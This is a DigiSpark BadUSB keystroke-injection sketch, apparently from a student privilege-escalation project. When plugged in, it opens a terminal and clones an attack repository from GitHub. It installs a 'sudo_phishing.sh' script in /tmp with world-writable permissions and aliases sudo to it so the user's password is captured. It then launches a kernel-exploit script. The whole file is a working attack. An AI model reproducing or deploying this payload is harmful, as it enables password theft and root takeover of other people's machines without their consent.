#include "DigiKeyboard.h"
void setup() {
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_T,MOD_CONTROL_LEFT|MOD_ALT_LEFT);
    DigiKeyboard.delay(1000);
    DigiKeyboard.print("git clone https://github.com/Jidnyesh/Final-Project-Priv-Escalation.git");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(2000);
    DigiKeyboard.print("cd Final-Project-Priv-Escalation/fake-sudo");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.print("chmod +x sudo_phishing.sh"); 
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.print("cp sudo_phishing.sh /tmp/sudo_phishing.sh");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.print("chmod 777 /tmp/sudo_phishing.sh");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.print("echo \"alias sudo='/tmp/sudo_phishing.sh'\" >> ~/.bash_aliases");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);

    DigiKeyboard.print("source ~/.bash_aliases");

    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.print(". ~/.bash_aliases");
        DigiKeyboard.sendKeyStroke(KEY_ENTER);

    DigiKeyboard.print("cd ../kernel-exploits");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.print("python3 main.py");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(500);
    

}

void loop() {
}
